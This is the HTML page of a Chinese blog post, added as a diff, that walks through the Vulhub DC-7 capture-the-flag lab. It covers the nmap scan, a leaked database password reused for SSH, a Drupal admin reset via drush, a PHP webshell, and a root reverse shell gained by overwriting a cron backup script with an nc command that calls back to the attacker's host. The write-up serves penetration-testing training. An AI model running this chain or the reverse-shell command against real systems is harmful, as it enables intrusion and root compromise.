@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Vulhub DC7 靶场 | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Vulhub DC7 靶场 - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/penetration/vulhubdc7/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration/vulhubdc7/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Vulhub DC7 靶场
+    </h1>
+    <div class="post-meta"><span title='2025-09-28 00:00:00 +0000 UTC'>September 28, 2025</span>
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>nmap扫描开放端口及服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap 61.139.2.0/24
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 61.139.2.137
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00048s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><p>访问web服务：</p>
+<p><img alt="alt" loading="lazy" src="/images/Vulhub/5.png"></p>
+<p><code>https://github.com/Dc7User</code>中有网站源码，config.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	$servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
+</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dc7user&#34;</span>;
+</span></span><span style="display:flex;"><span>	$password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;MdR3xOgB7#dW&#34;</span>;
+</span></span><span style="display:flex;"><span>	$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Staff&#34;</span>;
+</span></span><span style="display:flex;"><span>	$conn <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_connect</span>($servername, $username, $password, $dbname);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>网站登录失败，尝试ssh登录成功，<code>dc7user</code>目录下存在<code>mbox</code>文件，渗透时收到一封邮件：</p>
+<pre tabindex="0"><code>You have new mail in /var/mail/dc7user
+</code></pre><p>/var/mail/dc7user其中一封邮件：</p>
+<pre tabindex="0"><code>From root@dc-7 Sun Sep 28 12:45:04 2025
+Return-path: &lt;root@dc-7&gt;
+Envelope-to: root@dc-7
+Delivery-date: Sun, 28 Sep 2025 12:45:04 +1000
+Received: from root by dc-7 with local (Exim 4.89)
+        (envelope-from &lt;root@dc-7&gt;)
+        id 1v2hPM-0000N4-Ms
+        for root@dc-7; Sun, 28 Sep 2025 12:45:04 +1000
+From: root@dc-7 (Cron Daemon)
+To: root@dc-7
+Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;
+X-Cron-Env: &lt;SHELL=/bin/sh&gt;
+X-Cron-Env: &lt;HOME=/root&gt;
+X-Cron-Env: &lt;LOGNAME=root&gt;
+Message-Id: &lt;E1v2hPM-0000N4-Ms@dc-7&gt;
+Date: Sun, 28 Sep 2025 12:45:04 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               [success]
+</code></pre><p>每封邮件内容一致，每15分钟有一封，也就是说存在每15分钟执行一次的定时任务：</p>
+<pre tabindex="0"><code>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh
+</code></pre><p>查看sh脚本权限：</p>
+<pre tabindex="0"><code>$ ls /opt/scripts/backups.sh -l
+-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh
+</code></pre><p>/opt/scripts/backups.sh：</p>
+<pre tabindex="0"><code>#!/bin/bash
+rm /home/dc7user/backups/*
+cd /var/www/html/
+drush sql-dump --result-file=/home/dc7user/backups/website.sql
+cd ..
+tar -czf /home/dc7user/backups/website.tar.gz html/
+gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
+gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
+chown dc7user:dc7user /home/dc7user/backups/*
+rm /home/dc7user/backups/website.sql
+rm /home/dc7user/backups/website.tar.gz
+</code></pre><p>接下来就是获取www-data的权限，先查看drush的权限：</p>
+<pre tabindex="0"><code>$ ls /usr/local/bin/drush -l
+-rwxr-xr-x 1 root root 4789623 Jul 10  2019 /usr/local/bin/drush
+</code></pre><p>Drush可以用于直接从云服务器命令行管理 Drupal：</p>
+<pre tabindex="0"><code>$ drush status
+ Drupal version                  :  8.7.6                                                                                                      
+ Site URI                        :  http://default                                                                                             
+ Database driver                 :  mysql                                                                                                      
+ Database hostname               :  localhost                                                                                                  
+ Database port                   :                                                                                                             
+ Database username               :  db7user                                                                                                    
+ Database name                   :  d7db                                                                                                       
+ Database                        :  Connected                                                                                                  
+ Drupal bootstrap                :  Successful                                                                                                 
+ Drupal user                     :                                                                                                             
+ Default theme                   :  bartik                                                                                                     
+ Administration theme            :  seven                                                                                                      
+ PHP configuration               :  /etc/php/7.0/cli/php.ini                                                                                   
+ PHP OS                          :  Linux                                                                                                      
+ Drush script                    :  /usr/local/bin/drush                                                                                       
+ Drush version                   :  8.3.0                                                                                                      
+ Drush temp directory            :  /tmp                                                                                                       
+ Drush configuration             :                                                                                                             
+ Drush alias files               :                                                                                                             
+ Install profile                 :  standard                                                                                                   
+ Drupal root                     :  /var/www/html                                                                                              
+ Drupal Settings File            :  sites/default/settings.php                                                                                 
+ Site path                       :  sites/default                                                                                              
+ File directory path             :  sites/default/files                                                                                        
+ Temporary file directory path   :  /tmp                                                                                                       
+ Sync config path                :  sites/default/files/config_yQDLLJdPf9UT4DSAB5Wfl6XeoBn0AqtLqUYyVc4KUWQW-3USMUdXWY0UZmZ3Az5mT_DMS955DQ/sync 
+</code></pre><p>尝试修改admin密码：</p>
+<pre tabindex="0"><code>$ drush user-password admin --password=&#34;12345&#34;
+Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.               [error]
+The drush command &#39;user-password admin&#39; could not be executed.
+
+$ cd /var/www/html
+$ drush user-password admin --password=&#34;12345&#34;
+Changed password for admin
+</code></pre><p>Drush8中存在可以解析php内容的插件：<code>https://www.drupal.org/project/php</code>，添加对应插件并使用：</p>
+<p><img alt="alt" loading="lazy" src="/images/Vulhub/6.png"></p>
+<p>写入一句话木马：</p>
+<p><img alt="alt" loading="lazy" src="/images/Vulhub/7.png"></p>
+<p>蚁剑连上终端就是<code>www-data</code>用户，修改<code>/opt/scripts/backups.sh</code>文件实现反弹shell，等待定时任务执行实现提取：</p>
+<pre tabindex="0"><code>$ echo &#39;nc 61.139.2.128 2333 -e /bin/bash&#39; &gt; /opt/scripts/backups.sh
+</code></pre><p>拿到root权限后先看一下定时任务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>crontab -l
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Edit this file to introduce tasks to be run by cron.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Each task to run has to be defined through a single line</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># indicating with different fields when the task will be run</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and what command to run for the task</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To define the time you can provide concrete values for</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># minute (m), hour (h), day of month (dom), month (mon),</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Notice that tasks will be started based on the cron&#39;s system</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># daemon&#39;s notion of time and timezones.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output of the crontab jobs (including errors) is sent through</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># email to the user the crontab file belongs to (unless redirected).</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># For example, you can run a backup of all your user accounts</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># at 5 a.m every week with:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># For more information see the manual pages of crontab(5) and cron(8)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h  dom mon dow   command</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*/15 * * * * /opt/scripts/backups.sh
+</span></span></code></pre></div><p>theflag.txt：</p>
+<pre tabindex="0"><code>
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888 
+888   o   888          888 888      888  &#34;Y88b                            888 888 888 888 
+888  d8b  888          888 888      888    888                            888 888 888 888 
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
+888d88888b888 d8P  Y8b 888 888      888    888 d88&#34;&#34;88b 888 &#34;88b d8P  Y8b 888 888 888 888 
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &#34;   &#34;   &#34;   &#34;  
+888P     Y888  &#34;Y8888  888 888      8888888P&#34;   &#34;Y88P&#34;  888  888  &#34;Y8888  888 888 888 888 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and all those who have taken the time to complete these little
+challenges.
+
+I&#39;m sending out an especially big thanks to:
+
+@4nqr34z
+@D4mianWayne
+@0xmzfr
+@theart42
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</code></pre><p>参考资料：</p>
+<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
+<p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
